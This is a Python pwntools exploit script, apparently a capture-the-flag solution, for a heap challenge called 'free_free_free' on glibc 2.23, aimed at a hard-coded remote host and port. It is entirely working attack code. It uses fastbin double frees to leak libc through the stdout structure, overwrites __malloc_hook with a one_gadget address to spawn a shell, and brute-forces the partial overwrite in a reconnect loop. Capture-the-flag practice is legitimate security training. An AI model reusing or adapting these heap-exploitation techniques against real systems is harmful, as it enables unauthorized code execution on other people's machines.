# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './free_free_free'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.23.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '183.129.189.60'
    port = '10023'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size , text = '\n'):
    cmd(1)
    sla('size>',size)
    sa('message>' ,text )

def delete( idx ):
    cmd(2)
    sla('idx>' , idx)

one_gad = one_gadget(libc.path)

def pwn():
    add(0x28 , flat( 0,0,0,0x21 ))
    add(0x7f)
    add(0x18)
    add(0x18)

    delete(1)
    add(0x18)
    add(0x68)

    delete(2)
    delete(3)
    delete(2)

    add(0x18 , '\x20' )
    add(0x18)
    add(0x18)
    add(0x18 , flat(0 , 0x91))
    add(0x28) #10
    add(0x68)
    add(0x68)

    delete(5)
    delete(1)
    add(0x18 , flat(0 , 0x31))


    delete(10)
    delete(0)
    delete(10)

    add( 0x28 , '\x40' )
    add( 0x28)
    add( 0x28)
    add( 0x28 , flat( 0, 0x71 ) + p16(0x25dd))

    add( 0x68)
    payload = '\x00'*0x33 + flat( 0xfbad1800 , 0,0,0 ) + '\x00'

    add( 0x68 , payload)
    
    _IO_2_1_stdout_ = l64() + 0x20
    lg('_IO_2_1_stdout_',_IO_2_1_stdout_)

    libc.address = _IO_2_1_stdout_ - libc.sym['_IO_2_1_stdout_']
    __malloc_hook = libc.sym['__malloc_hook']
    realloc = libc.sym['realloc']
    lg('__malloc_hook',__malloc_hook)

    delete(11)
    delete(12)
    delete(11)

    add(0x68 , p64(__malloc_hook - 0x23))
    add(0x68)
    add(0x68)

    payload = '\x00'*11  + p64(one_gad[1] + libc.address) +  p64(realloc +4)
    add(0x68 , payload)

    # dbg('malloc')
    cmd(1)
    sla('size' , 0x20)

    p.interactive()


exhaust(pwn)

'''
@File    :   free_free_free.py
@Time    :   2021/10/11 10:10:35
@Author  :   Niyah 
'''